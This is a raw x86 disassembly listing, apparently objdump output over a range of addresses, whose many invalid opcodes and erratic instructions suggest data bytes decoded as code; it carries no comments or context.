  4335f7:	xlat   BYTE PTR ds:[ebx]
  4335f8:	int    0xc8
  4335fa:	into   
  4335fb:	out    0xf5,al
  4335fd:	out    0x89,eax
  4335ff:	push   ds
  433600:	(bad)  
  433601:	push   DWORD PTR [edi+0x45]
  433604:	(bad)  
  433606:	pop    esp
  433607:	sub    edi,edi
  433609:	dec    esi
  43360b:	outs   dx,BYTE PTR ds:[esi]
  43360c:	jl     0x433606
  43360e:	mov    cs,WORD PTR [esi]
  433610:	xor    DWORD PTR [ebp+0x19],esi
  433613:	div    BYTE PTR [edi+0x12fe1523]
  433619:	loopne 0x43363a
  43361b:	pop    ecx
  43361c:	inc    DWORD PTR [esi+0x7a3094b5]
  433622:	cmc    
  433623:	cmp    bh,0x52
  433626:	mov    ds:0xae85d00,al
  43362b:	cwde   
  43362c:	iret   
  43362d:	cs or  eax,0xc141c100
  433633:	daa    
  433634:	retf   0xf7a
  433637:	jge    0x4335e2
  433639:	mov    bh,0x1d
  43363b:	shr    BYTE PTR [edi-0x4f],1
  43363e:	push   cs
  43363f:	daa    
  433640:	fadd   QWORD PTR [edi+0x1b]
  433643:	shr    al,0x7a
  433646:	iret   
  433647:	neg    DWORD PTR [eax+0x2]
  43364a:	jb     0x43364e
  43364c:	xlat   BYTE PTR ds:[ebx]
  43364d:	inc    ebx
	...
  43366a:	add    BYTE PTR [eax],al
  43366c:	mov    dh,0x41
  43366e:	in     eax,dx
  43366f:	add    esi,DWORD PTR [edx]
  433671:	aam    0x2
  433673:	test   DWORD PTR [ebp-0x1e],eax
  433676:	cld    
  433677:	adc    ch,BYTE PTR [edi-0x41177e7e]
  43367d:	cli    
  43367e:	or     al,BYTE PTR [ebp+0x6f4c425]
  433684:	scas   eax,DWORD PTR es:[edi]
  433685:	jl     0x4336b0
  433687:	mov    dh,0x5
  433689:	call   0x84e7:0x78accbbc
  433690:	retf   
  433691:	add    ebx,eax
  433693:	jl     0x4336a1
  433695:	sahf   
  433696:	outs   dx,DWORD PTR ds:[esi]
  433697:	add    eax,0x84e7427a
  43369c:	int3   
  43369d:	add    edx,esp
  43369f:	js     0x4336ad
  4336a1:	sahf   
  4336a2:	arpl   WORD PTR [ebx+0x58],ax
  4336a5:	xor    al,0xd6
  4336a7:	inc    ebx
  4336a8:	outs   dx,DWORD PTR ds:[esi]
  4336a9:	jns    0x433692
  4336ab:	inc    esp
  4336ac:	mov    dh,BYTE PTR [ebx-0x54df834]
  4336b2:	pop    esi
  4336b3:	add    al,BYTE PTR [ecx]
  4336b5:	cli    
  4336b6:	jl     0x4336b2
  4336b8:	div    ah
  4336ba:	je     0x4336c2
  4336bc:	dec    esp
  4336bd:	jmp    0x4336be
  4336bf:	es pusha 
  4336c1:	das    
  4336c2:	xchg   DWORD PTR [eax],ebp
  4336c4:	rol    edx,0x23
  4336c7:	in     eax,dx
  4336c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4336c9:	cmp    BYTE PTR [ebp+esi*8-0x73],dh
  4336cd:	rol    BYTE PTR [eax],1
  4336cf:	adc    al,BYTE PTR [eax]
	...
  4336ed:	add    bl,ah
  4336ef:	xchg   esi,eax
  4336f0:	or     ebp,DWORD PTR [ecx+0x70]
  4336f3:	repz je 0x4336e4
  4336f6:	mov    gs,ebp
  4336f8:	add    eax,0xc67f0f34
  4336fd:	sub    al,ch
  4336ff:	cli    
  433700:	mov    ebp,0x86cd0ee5
  433705:	xchg   ebp,eax
  433706:	mov    ss,WORD PTR [ebx]
  433708:	xor    al,0x3a
  43370a:	cmp    edi,DWORD PTR [ebp-0xf]
  43370d:	lahf   
  43370e:	push   ebx
  43370f:	or     dl,BYTE PTR [eax]
  433711:	test   DWORD PTR ss:[ebp+eiz*2+0x457360c9],esi
  433719:	cdq    
  43371a:	pop    ecx
  43371b:	push   ds
  43371c:	loopne 0x433705
  43371e:	push   cs
  43371f:	add    BYTE PTR [edi+0x4],bh
  433722:	in     eax,dx
  433723:	sbb    ch,BYTE PTR [edi]
  433725:	inc    edx
  433726:	push   ds
  433727:	sub    DWORD PTR [ecx],edi
  433729:	mov    edi,0x621db1fe
  43372e:	sar    ecx,cl
  433730:	(bad)  
  433731:	and    eax,0x72dbbb80
  433736:	shl    ebp,cl
  433738:	es mov WORD PTR es:[ebx+0x45d460cf],?
  433740:	call   0xfb6c69b4
  433745:	ins    DWORD PTR es:[edi],dx
  433746:	push   ecx
  433747:	stos   DWORD PTR es:[edi],eax
  433748:	or     DWORD PTR [esi-0x64f05819],esp
  43374e:	pop    eax
  43374f:	ja     0x4337ab
  433751:	cmc    
	...
  43376e:	add    BYTE PTR [eax],al
  433770:	inc    ecx
  433771:	retf   0x17
  433774:	pop    ds
  433775:	cmp    eax,DWORD PTR [edx-0x40fee3bb]
  43377b:	mov    DWORD PTR [edx],esp
  43377d:	or     eax,0xb1bc4689
  433782:	add    bl,ch
  433784:	clc    
  433785:	xor    BYTE PTR [ebx+0x3da4b333],bh
  43378b:	adc    al,0xed
  43378d:	aaa    
  43378e:	jmp    0x4337c9
  433790:	sub    ah,BYTE PTR [esi+eax*1]
  433793:	test   BYTE PTR [ecx+0x1],dl
  433796:	add    BYTE PTR [eax],al
  433798:	ja     0x43377e
  43379a:	inc    eax
  43379b:	mov    DWORD PTR [ecx],esi
  43379d:	call   0xaadf852a
  4337a2:	inc    ebp
  4337a3:	add    al,0xde
  4337a5:	hlt    
  4337a6:	pop    es
  4337a7:	cmp    dl,BYTE PTR [edx+0x68]
  4337aa:	or     bh,BYTE PTR [ebx]
  4337ac:	and    cl,BYTE PTR [edi+eax*1]
  4337af:	test   DWORD PTR [ecx-0x42ffffff],esp
  4337b5:	push   edx
  4337b6:	adc    esi,DWORD PTR [edx]
  4337b8:	fs ss pop ecx
  4337bb:	pop    ebx
  4337bc:	ins    DWORD PTR es:[edi],dx
  4337bd:	ret    0x5e31
  4337c0:	xor    eax,0x24e47f26
  4337c5:	add    DWORD PTR [eax],eax
  4337c7:	cmp    esi,DWORD PTR [edx]
  4337c9:	adc    DWORD PTR [eax+ebp*8+0x6f],esi
  4337cd:	arpl   WORD PTR [edi],ax
  4337cf:	mov    bh,al
  4337d1:	and    eax,0x4e82
	...
  4337f2:	lock test al,0x54
  4337f5:	(bad)  
  4337f6:	cmp    bh,BYTE PTR [ebx+ecx*1-0x3f15498c]
  4337fd:	or     BYTE PTR [eax+0x734b8d0f],bl
  433803:	cmp    ecx,0x80017b19
  433809:	ret    
  43380a:	or     eax,0x82468037
  43380f:	xchg   esi,eax
  433810:	sub    ebx,DWORD PTR [ecx]
  433812:	inc    edx
  433813:	adc    al,0x7f
  433815:	mov    esi,0x87e811ed
  43381a:	inc    eax
  43381b:	sbb    DWORD PTR cs:0x503dd512,ebx
  433822:	call   0x7917:0x4d13eb23
  433829:	fcomp  DWORD PTR [edx]
  43382b:	(bad)  
  43382c:	ret    
  43382d:	cli    
  43382e:	fnsave ds:0xd7213c13
  433834:	add    ecx,DWORD PTR [eax+0x457965c8]
  43383a:	pop    ebp
  43383b:	mov    al,ds:0x9127fad2
  433840:	mov    eax,0xfd46359
  433845:	(bad)  
  433846:	fidiv  WORD PTR [ecx+0x417f783]
  43384c:	call   0xb2867fd0
  433851:	sbb    al,BYTE PTR [esi+0x372beb]
	...
  433873:	add    bl,al
  433875:	inc    esi
  433876:	cld    
  433877:	jle    0x433819
  433879:	lods   eax,DWORD PTR ds:[esi]
  43387a:	sub    al,0xfb
  43387c:	xchg   esi,eax
  43387d:	add    al,0x0
  43387f:	cmp    BYTE PTR [ecx-0x77f50121],bh
  433885:	dec    esi
  433886:	sub    al,0xfb
  433888:	or     dl,BYTE PTR [ebx+0x2c]
  43388b:	inc    ebp
  43388c:	add    eax,0xf77fdcbf
  433891:	das    
  433892:	cld    
  433893:	test   BYTE PTR [edx+eiz*8+0x2c],dl
  433897:	sti    
  433898:	(bad)  
  433899:	out    dx,al
  43389a:	cli    
  43389b:	or     cl,BYTE PTR [eax-0x2504d377]
  4338a1:	add    BYTE PTR [esi-0x41],ch
  4338a4:	fsubrp st(7),st
  4338a6:	stos   BYTE PTR es:[edi],al
  4338a7:	sti    
  4338a8:	pop    ss
  4338a9:	jg     0x433858
  4338ab:	sub    al,0xc6
  4338ad:	and    ebx,DWORD PTR [esi-0x42]
  4338b0:	push   cs
  4338b1:	call   0xf34f3b52
  4338b6:	arpl   bp,si
  4338b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4338b9:	and    esi,edx
  4338bb:	ret    
  4338bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4338bd:	mov    ebp,0xbd97c4f4
  4338c2:	loopne 0x433887
  4338c4:	xchg   edi,eax
  4338c5:	mov    ebp,0x2fd07ad4
  4338ca:	push   cs
  4338cb:	(bad)  
  4338cc:	or     dh,bl
  4338ce:	arpl   di,di
  4338d0:	ja     0x4338f5
  4338d2:	ret    0xb2f0
  4338d5:	sub    ah,BYTE PTR [ebx]
  4338d7:	adc    BYTE PTR [eax],al
	...
  4338f5:	add    BYTE PTR [ecx+edi*2],cl
  4338f8:	xor    ecx,DWORD PTR [ecx+ebx*8]
  4338fb:	stos   DWORD PTR es:[edi],eax
  4338fc:	in     eax,dx
  4338fd:	lods   eax,DWORD PTR ds:[esi]
  4338fe:	or     dh,bl
  433900:	jl     0x433945
  433902:	fs repnz cdq 
  433905:	sub    al,0x46
  433907:	ja     0x43393c
  433909:	cld    
  43390a:	mov    BYTE PTR [edx-0x4208719],dh
  433910:	sub    cl,ch
  433912:	jae    0x4338c3
  433914:	loope  0x433901
  433916:	push   ss
  433917:	(bad)  
  433918:	cld    
  433919:	xor    eax,0xfbf43eda
  43391e:	xchg   ebx,eax
  43391f:	mov    edx,0x22591af8
  433924:	pop    edx
  433925:	sub    al,0x73
  433927:	loopne 0x4338e3
  433929:	jle    0x43397b
  43392b:	push   eax
  43392c:	mov    eax,0xe8f5441b
  433931:	add    ecx,DWORD PTR [edi*4+0x4851da14]
  433938:	add    BYTE PTR [eax-0x50],ah
  43393b:	or     ah,bh
  43393d:	add    BYTE PTR [esi+edi*4+0xb],dl
  433941:	jmp    0xbe45:0x3d457949
  433948:	cmpps  xmm1,XMMWORD PTR [ecx+0x75],0x4d
  43394d:	cmp    DWORD PTR [edi],esi
  43394f:	mov    ebp,0x28d711df
  433954:	sti    
  433955:	(bad)  
  433956:	and    dh,BYTE PTR [ebp+0xeae7]
	...
  433978:	loope  0x4339f2
  43397a:	dec    edx
  43397b:	rcl    DWORD PTR [edx+0x616c0b3f],1
  433981:	sub    bl,bh
  433983:	fimul  WORD PTR [esi-0x17]
  433986:	jns    0x433981
  433988:	mov    eax,0x278ae934
  43398d:	daa    
  43398e:	sti    
  43398f:	sub    DWORD PTR [eax],edx
  433991:	xchg   edx,edi
  433993:	mov    esi,0xc586cd36
  433998:	mov    bl,BYTE PTR [ebx]
  43399a:	clc    
  43399b:	push   0xfffffff5
  43399d:	jmp    0x4339ed
  43399f:	aas    
  4339a0:	ds sar edx,1
  4339a3:	push   0x74
  4339a5:	push   cs
  4339a6:	add    DWORD PTR [eax+0x75],esp
  4339a9:	ficom  WORD PTR [edi]
  4339ab:	ficom  WORD PTR [eax+0xee9009a]
  4339b1:	jne    0x4339f7
  4339b3:	lds    edx,FWORD PTR [esi]
  4339b5:	shl    bh,1
  4339b7:	sub    DWORD PTR ds:0xd165fb28,esi
  4339bd:	test   BYTE PTR [ebx+0x9c0],0x1a
  4339c4:	push   ecx
  4339c5:	ror    BYTE PTR [eax+0x38dde2ad],0xa4
  4339cc:	or     dh,ch
  4339ce:	add    DWORD PTR [eax],0xfffffb08
  4339d4:	pop    edi
  4339d5:	test   ebx,0x82fdb412
  4339db:	dec    ebp
	...
  4339f8:	add    BYTE PTR [eax],al
  4339fa:	mov    ah,0x4e
  4339fc:	jmp    FWORD PTR gs:[ebx]
  4339ff:	xor    BYTE PTR [eax-0x4f15e3a9],al
  433a05:	call   FWORD PTR [ebx]
  433a07:	mov    eax,ds:0x41a089ef
  433a0c:	sbb    edi,DWORD PTR [ebx]
  433a0e:	mov    bl,0x26
  433a10:	jg     0x433a38
  433a12:	mov    ch,0xfd
  433a14:	(bad)  
  433a15:	jg     0x433a30
  433a17:	sub    ebx,edi
  433a19:	jae    0x4339d5
  433a1b:	dec    edi
  433a1c:	div    BYTE PTR [ebp-0x64]
  433a1f:	add    eax,0xd66a4122
  433a24:	call   0x40af13
  433a29:	mov    dh,BYTE PTR [ecx]
  433a2b:	and    al,0xe3
  433a2d:	or     ah,BYTE PTR ds:0x3089f6d6
  433a33:	and    BYTE PTR [edi],dl
  433a35:	lea    esi,[eax]
  433a37:	and    BYTE PTR [edi],cl
  433a39:	push   eax
  433a3a:	in     eax,dx
  433a3b:	pop    eax
  433a3c:	pop    ds
  433a3d:	sbb    BYTE PTR [esi+ecx*8+0x32],bh
  433a41:	(bad)  
  433a42:	stos   DWORD PTR es:[edi],eax
  433a43:	mov    eax,ds:0x95b00fbf
  433a48:	(bad)  
  433a49:	jmp    DWORD PTR [eax+ebp*4]
  433a4c:	inc    ebx
  433a4d:	and    al,0x5c
  433a4f:	dec    ebp
  433a50:	div    BYTE PTR [eax+edx*2+0x1d]
  433a54:	jecxz  0x433a74
  433a56:	pop    edx
  433a57:	xlat   BYTE PTR ds:[ebx]
  433a58:	test   BYTE PTR [ebx-0x76dce008],0x0
	...
  433a7b:	add    BYTE PTR [eax+0x41],bl
  433a7e:	das    
  433a7f:	push   ecx
  433a80:	jg     0x433a67
  433a82:	mov    ebp,0xeff30d44
  433a87:	inc    DWORD PTR [ebp-0x7bc424a6]
  433a8d:	cmp    bl,bl
  433a8f:	aas    
  433a90:	cmc    
  433a91:	jb     0x433a4e
  433a93:	stc    
  433a94:	loop   0x433a28
  433a96:	or     edx,DWORD PTR ds:[ecx+0xdfffe95]
  433a9d:	popa   
  433a9e:	inc    ecx
  433a9f:	inc    esp
  433aa0:	icebp  
  433aa1:	and    eax,0x61defaff
  433aa6:	js     0x433af4
  433aa8:	icebp  
  433aa9:	dec    edx
  433aaa:	jl     0x433af0
  433aac:	jmp    0xf1bfb717
  433ab1:	dec    edx
  433ab2:	pop    ss
  433ab3:	loope  0x433afe
  433ab5:	sub    DWORD PTR [ecx],ebp
  433ab7:	xchg   DWORD PTR [ebp+0x2e742e6d],ebx
  433abd:	loope  0x433ae7
  433abf:	iret   
  433ac0:	xchg   esi,eax
  433ac1:	rcr    bh,cl
  433ac3:	pop    ds
  433ac4:	fucom  st(0)
  433ac6:	sub    BYTE PTR [ecx+esi*1+0xb],dh
  433aca:	cmc    
  433acb:	mov    edi,0xfa4b8965
  433ad0:	push   0xffffff9a
  433ad2:	inc    ebx
  433ad3:	je     0x433ad6
  433ad5:	push   0xffffffb0
  433ad7:	and    edi,ebp
  433ad9:	ret    
  433ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433adb:	and    ebx,DWORD PTR [ecx]
  433add:	(bad)
	...
  433afd:	add    BYTE PTR [ebx-0x7f],cl
  433b00:	add    al,0xb9
  433b03:	pop    ds
  433b04:	sub    BYTE PTR [ecx+esi*8+0x26],cl
  433b08:	inc    ecx
  433b09:	inc    esp
  433b0a:	jmp    0x2a723938
  433b0f:	mov    eax,ds:0xa9fd23bf
  433b14:	scas   eax,DWORD PTR es:[edi]
  433b15:	and    edi,ebp
  433b17:	ret    
  433b18:	mov    bh,0x23
  433b1a:	fcos   
  433b1c:	push   eax
  433b1d:	xchg   edx,eax
  433b1e:	push   ecx
  433b1f:	push   ds
  433b20:	pop    edx
  433b21:	jge    0x433b20
  433b23:	fistp  DWORD PTR [ecx-0x51]
  433b26:	rol    DWORD PTR [eax+0x7dfcd],0xbd
  433b2d:	adc    ah,dh
  433b2f:	xchg   esp,eax
  433b30:	add    al,0xec
  433b32:	mov    eax,esp
  433b34:	or     al,0xec
  433b36:	xlat   BYTE PTR ds:[ebx]
  433b37:	xchg   esp,eax
  433b38:	add    al,0xe4
  433b3a:	jmp    0x958d:0xc629e4dc
  433b41:	fcomip st,st(2)
  433b43:	daa    
  433b44:	adc    eax,0x5c1fb4c5
  433b49:	mov    al,0xee
  433b4b:	repz adc BYTE PTR [ecx],dh
  433b4e:	jecxz  0x433b6d
  433b50:	cli    
  433b51:	sub    BYTE PTR [ecx],bl
  433b53:	in     al,0xc8
  433b55:	sbb    ebp,DWORD PTR [ebx+ecx*1]
  433b58:	jmp    0xd07c560
  433b5d:	loopne 0x433ba9
  433b5f:	mov    DWORD PTR ds:0xe0,esp
	...
  433b7d:	add    BYTE PTR [eax],al
  433b7f:	add    BYTE PTR [esi],ch
  433b81:	fld    TBYTE PTR [ebx]
  433b83:	adc    BYTE PTR [esi],al
  433b85:	sbb    BYTE PTR [edi+0x741f7629],0xaf
  433b8c:	cs clc 
  433b8e:	rcl    BYTE PTR [ebx+ebx*1+0x1e],1
  433b92:	mov    dl,0x73
  433b94:	or     al,0x2b
  433b96:	fidiv  WORD PTR [esi-0x27]
  433b99:	jecxz  0x433b9b
  433b9b:	sbb    al,0x4f
  433b9d:	ficomp DWORD PTR [edx+0x323ff328]
  433ba3:	retf   0x8ae3
  433ba6:	test   dh,al
  433ba8:	jo     0x433b9a
  433baa:	call   0x666fcf7d
  433baf:	pop    ds
  433bb0:	and    eax,0x9a850081
  433bb5:	(bad)  
  433bb6:	(bad)  
  433bb7:	call   0x1a95ecf5
  433bbc:	pop    eax
  433bbd:	iret   
  433bbe:	gs pop esi
  433bc0:	adc    DWORD PTR [eax],0xcdfadffb
  433bc6:	out    0x62,eax
  433bc8:	jle    0x433be5
  433bca:	sti    
  433bcb:	call   0x87e6:0xb7fb1988
  433bd2:	inc    esp
  433bd3:	or     eax,0xb2e7cdb5
  433bd8:	pop    esi
  433bd9:	sbb    edi,ebx
  433bdb:	mov    edx,0x97fb19a8
  433be0:	mov    edx,0xcd4487
	...
  433c01:	add    BYTE PTR [edx+0x3e82e7cd],ch
  433c07:	sbb    edi,ebx
  433c09:	jb     0x433be9
  433c0b:	mov    BYTE PTR [ebp+eax*8-0x62],dh
  433c0f:	xlat   BYTE PTR ds:[ebx]
  433c10:	pop    ebx
  433c11:	int    0xae
  433c13:	or     DWORD PTR [eax+ecx*4+0x2000000f],eax
  433c1a:	push   ebp
  433c1b:	loop   0x433c44
  433c1d:	out    dx,al
  433c1e:	add    dh,BYTE PTR [ebx-0x28f11700]
  433c24:	out    dx,al
  433c25:	fdivrp st(2),st
  433c27:	retf   0xe900
  433c2a:	push   cs
  433c2b:	fcomp  DWORD PTR [ecx+esi*8-0x4e]
  433c2f:	repnz cli 
  433c31:	cmp    eax,0x35fae66d
  433c36:	ins    DWORD PTR es:[edi],dx
  433c37:	loop   0x433c20
  433c39:	adc    BYTE PTR [edx+ebx*1+0x28d173fb],0x32
  433c41:	call   0x25d03c54
  433c46:	sub    eax,0x9d004fe2
  433c4b:	inc    edi
  433c4c:	pop    ds
  433c4d:	xor    BYTE PTR [esp+ecx*4+0x3a],bh
  433c51:	(bad)  
  433c52:	mov    ds:0x2089f79a,eax
  433c57:	ds pop ss
  433c59:	cmp    ebp,DWORD PTR [edi+0x15]
  433c5c:	jg     0x433c6f
  433c5e:	cmc    
  433c5f:	add    DWORD PTR [eax],eax
  433c61:	(bad)  
  433c62:	fdivr  DWORD PTR ds:0x8d23
	...
  433c84:	mov    al,ds:0xa8ff533d
  433c89:	cmp    eax,0x6f0ee81f
  433c8e:	idiv   edi
  433c90:	outs   dx,DWORD PTR ds:[esi]
  433c91:	push   eax
  433c92:	pop    ds
  433c93:	and    al,0x67
  433c95:	pusha  
  433c96:	pop    ds
  433c97:	sbb    BYTE PTR [ebx+ebx*8+0x1b32443],dh
  433c9e:	test   esi,esi
  433ca0:	mov    bl,0x9d
  433ca2:	(bad)  
  433ca3:	add    BYTE PTR [ecx+eax*1-0x6531099d],ah
  433caa:	mov    esi,0xfa275c8d
  433caf:	mul    BYTE PTR [edi]
  433cb1:	les    eax,FWORD PTR [ebx]
  433cb3:	push   0x5e
  433cb5:	pushf  
  433cb6:	dec    ebx
  433cb7:	and    al,0xc
  433cb9:	fwait
  433cba:	inc    ebx
  433cbb:	and    al,0x78
  433cbd:	dec    edx
  433cbe:	popa   
  433cbf:	mov    ebp,eax
  433cc1:	cmp    al,0x85
  433cc3:	add    BYTE PTR [ecx+eax*1+0x5e],ah
  433cc7:	test   DWORD PTR [ebp+ebp*2+0x5d0d6605],esi
  433cce:	xor    DWORD PTR [edi],ecx
  433cd0:	jmp    0x64433d55
  433cd5:	jnp    0x433c59
  433cd7:	test   BYTE PTR [eax-0x6b],bl
  433cda:	(bad)  
  433cdb:	push   DWORD PTR [ebx+edi*2]
  433cde:	test   al,al
  433ce0:	or     eax,0xf461f9fb
  433ce5:	in     eax,0xeb
  433ce7:	je     0x433ce9
	...
  433d05:	add    BYTE PTR [eax-0x3adc456d],bh
  433d0b:	neg    BYTE PTR [ecx-0x18b52e3e]
  433d11:	cmp    ah,bh
  433d13:	lahf   
  433d14:	mov    edx,0xfa64923
  433d19:	les    ebx,FWORD PTR [edi]
  433d1b:	dec    DWORD PTR [bx+si+0xb51]
  433d20:	call   0x144686ab
  433d25:	push   eax
  433d26:	xchg   esp,eax
  433d27:	push   0xffffffdb
  433d29:	inc    ebx
  433d2a:	loop   0x433d5f
  433d2c:	cmp    ecx,DWORD PTR [esi]
  433d2e:	dec    ebp
  433d2f:	daa    
  433d30:	js     0x433d7e
  433d32:	sub    DWORD PTR [ebx],edx
  433d34:	jl     0x433d7a
  433d36:	icebp  
  433d37:	push   0x3a
  433d39:	inc    esp
  433d3a:	jmp    0xbb433795
  433d3f:	es pop ss
  433d41:	xor    BYTE PTR [esi-0x327bddf3],dh
  433d47:	call   0x6e03:0x432136d5
  433d4e:	or     DWORD PTR [edx+0x75f923b2],esp
  433d54:	jbe    0x433d18
  433d56:	jne    0x433d5a
  433d58:	stc    
  433d59:	inc    DWORD PTR [edx+0x3123b83d]
  433d5f:	add    al,cl
  433d61:	and    ebx,DWORD PTR ds:0xd9fb3102
  433d67:	or     cl,BYTE PTR [edi+eiz*1]
	...
  433d86:	add    BYTE PTR [eax],al
  433d88:	out    dx,ax
  433d8a:	(bad)  
  433d8b:	and    eax,DWORD PTR [ecx]
  433d8d:	ins    DWORD PTR es:[edi],dx
  433d8e:	shl    BYTE PTR [ebx],0x2
  433d91:	sub    BYTE PTR [esp+eax*2],ah
  433d94:	icebp  
  433d95:	inc    DWORD PTR [eax]
  433d97:	jns    0x433d62
  433d99:	jecxz  0x433d5f
  433d9b:	add    bl,cl
  433d9d:	jecxz  0x433d97
  433d9f:	add    dl,cl
  433da1:	jecxz  0x433d97
  433da3:	add    BYTE PTR [edx],ah
  433da5:	(bad)  
  433da6:	sub    al,0xe0
  433da8:	cli    
  433da9:	or     al,0x67
  433dab:	mov    bh,0x17
  433dad:	sbb    al,0x72
  433daf:	test   BYTE PTR [ecx-0x7efc261d],dl
  433db5:	or     eax,0xfc2eb062
  433dba:	push   eax
  433dbb:	cmp    ecx,DWORD PTR [edx+ebx*1+0x52]
  433dbf:	jp     0x433d96
  433dc1:	daa    
  433dc2:	out    0xf1,eax
  433dc4:	ret    
  433dc5:	sbb    edi,DWORD PTR [ebp+0x622806df]
  433dcb:	sti    
  433dcc:	ficomp DWORD PTR [ebx]
  433dce:	fs mov al,0x2e
  433dd1:	in     al,dx
  433dd2:	inc    eax
  433dd3:	stc    
  433dd4:	add    eax,0x3925221a
  433dd9:	in     al,0xc8
  433ddb:	sbb    eax,DWORD PTR [eax+0x9]
  433dde:	jmp    0xc4d7f3e6
  433de3:	(bad)  [edx+0xd03efac]
  433de9:	sbb    esi,DWORD PTR [ebp-0x21]
	...
  433e08:	add    BYTE PTR [eax],al
  433e0a:	jmp    0x8a1b:0x92fa8627
  433e11:	lds    edx,FWORD PTR [eax+0x68793e3f]
  433e17:	mov    ebp,0xb47affa6
  433e1c:	pop    ebp
  433e1d:	pop    ss
  433e1e:	repnz and edx,ecx
  433e21:	sub    al,0x7
  433e24:	in     eax,dx
  433e25:	js     0x433dca
  433e27:	mov    gs,edi
  433e29:	cdq    
  433e2a:	or     eax,0x28dc0028
  433e2f:	pop    ss
  433e30:	sti    
  433e31:	ret    0xea0c
  433e34:	mov    edi,0xbdbd2372
  433e39:	in     eax,0xe
  433e3b:	mov    ch,0x86
  433e3d:	test   DWORD PTR [ebp+0x736af824],ecx
  433e43:	add    eax,DWORD PTR [edx+esi*2]
  433e46:	int3   
  433e47:	test   eax,0x28111308
  433e4c:	bnd je 0x433e38
  433e4f:	push   ss
  433e50:	out    0xeb,eax
  433e52:	cld    
  433e53:	pop    edx
  433e54:	xchg   DWORD PTR [ebx+ecx*8+0x5c],ecx
  433e58:	add    al,0xe9
  433e5a:	xor    DWORD PTR [ebx+eiz*1+0xa4dced],edx
  433e61:	ret    
  433e62:	movaps xmm7,XMMWORD PTR [edi]
  433e65:	inc    ebp
  433e66:	sub    DWORD PTR [edi],edx
  433e68:	mov    esi,0x74170ee5
  433e6d:	or     eax,0x0
	...
  433e8a:	add    BYTE PTR [eax],al
  433e8c:	or     eax,0xa4e965ca
  433e91:	jmp    edi
  433e93:	fucomi st,st(2)
  433e95:	push   ss
  433e96:	sti    
  433e97:	sub    edi,DWORD PTR [edx+0x1a62541a]
  433e9d:	sub    esp,0xcc5
  433ea3:	call   0xff96:0x7c7f319d
  433eaa:	push   edx
  433eab:	(bad)  
  433eac:	in     al,0x87
  433eae:	pop    ebp
  433eaf:	out    dx,al
  433eb0:	jle    0x433e32
  433eb2:	cs call 0x26ca3ec6
  433eb8:	add    eax,0x1ff1389e
  433ebd:	test   BYTE PTR [edx],ah
  433ebf:	call   0x953ed2
  433ec4:	add    al,0xdf
  433ec6:	adc    al,0x84
  433ec8:	aaa    
  433ec9:	ds sti 
  433ecb:	sbb    BYTE PTR [esp+eax*1+0x3e58507],0x0
  433ed3:	add    BYTE PTR [ebx+0x76],ch
  433ed6:	dec    DWORD PTR [ecx+eiz*1-0x64378518]
  433edd:	jmp    0x433f0c
  433edf:	stc    
  433ee0:	fiadd  WORD PTR [ebx-0x97de440]
  433ee7:	add    BYTE PTR [esi+edi*8],ah
  433eea:	mov    WORD PTR [ebp-0x91f88],es
	...
  433f0c:	add    BYTE PTR [eax],al
  433f0e:	and    al,0xec
  433f10:	loope  0x433f79
  433f12:	hlt    
  433f13:	std    
  433f14:	add    eax,0xffffffe0
  433f17:	div    BYTE PTR fs:[ebp+0x40]
  433f1b:	in     al,dx
  433f1c:	rol    ah,1
  433f1e:	pop    edx
  433f1f:	fld    QWORD PTR [edx+0x73f10ff0]
  433f25:	dec    ebp
  433f26:	xor    BYTE PTR [eax-0x7b],0xdc
  433f2a:	sbb    ebp,ebx
  433f2c:	not    BYTE PTR [eax-0x5c]
  433f2f:	in     eax,0x3f
  433f31:	dec    edx
  433f32:	jmp    0x433f10
  433f34:	test   al,al
  433f36:	mov    al,ds:0x91ff4a3a
  433f3b:	loope  0x433ec9
  433f3d:	inc    ebp
  433f3e:	add    al,0x54
  433f40:	mov    BYTE PTR [ebp-0x5c],bl
  433f43:	mov    WORD PTR [ebp-0xc],ds
  433f46:	sbb    eax,0x99e8f33f
  433f4b:	pop    ecx
  433f4c:	sti    
  433f4d:	push   eax
  433f4f:	ret    
  433f50:	jae    0x433f6b
  433f52:	imul   edi,DWORD PTR [eax],0xfffffff7
  433f55:	in     al,0x27
  433f57:	add    al,0x8d
  433f59:	test   DWORD PTR ds:0x6afb2053,ecx
  433f5f:	xlat   BYTE PTR ds:[ebx]
  433f60:	nop
  433f61:	inc    ebp
  433f62:	pop    ebp
  433f63:	imul   DWORD PTR [ebx]
  433f65:	or     al,0xb9
  433f67:	inc    DWORD PTR es:[edi+0x459051c8]
  433f6e:	cmp    eax,0x597c3f
	...
  433f8f:	add    BYTE PTR ds:0xf5e7b927,cl
  433f95:	push   cs
  433f96:	(bad)  
  433f97:	inc    DWORD PTR [eax+0x70e827fc]
  433f9d:	outs   dx,DWORD PTR ds:[esi]
  433f9e:	push   ds
  433f9f:	sti    
  433fa0:	ss dec eax
  433fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433fa3:	add    ecx,DWORD PTR [edi+eiz*1]
  433fa6:	dec    DWORD PTR [eax+ecx*4+0xafb2073]
  433fad:	neg    DWORD PTR [esi]
  433faf:	jae    0x433fba
  433fb1:	mov    ds:0x671c1ff7,al
  433fb6:	inc    DWORD PTR [edi+0x30]
  433fb9:	and    eax,0x320d0004
  433fbe:	test   eax,0x3c248c1
  433fc3:	cmp    BYTE PTR [eax],bh
  433fc5:	ficom  DWORD PTR [edx+0x76b865c]
  433fcb:	das    
  433fcc:	ret    
  433fcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433fce:	push   ss
  433fcf:	(bad)  
  433fd0:	cmp    bh,bh
  433fd2:	add    al,0xbb
  433fd5:	push   esi
  433fd6:	add    bl,0x5
  433fd9:	pop    edx
  433fda:	daa    
  433fdb:	aad    0xa1
  433fdd:	or     DWORD PTR [esi],ebx
  433fdf:	xchg   DWORD PTR [ebp+0x1075123d],ebx
  433fe5:	(bad)  
  433fe6:	mov    edi,0xad4da6fa
  433feb:	add    dh,bl
  433fed:	jo     0x433f7f
  433fef:	test   DWORD PTR [ecx-0x1],esp
  433ff2:	jecxz  0x434015
	...
  434010:	add    BYTE PTR [eax],al
  434012:	jbe    0x433fc3
  434014:	xor    eax,0x38f277b5
  434019:	cmc    
  43401a:	sub    al,BYTE PTR [eax]
  43401c:	data16 sbb al,0x2d
  43401f:	or     DWORD PTR [edx-0x39],esp
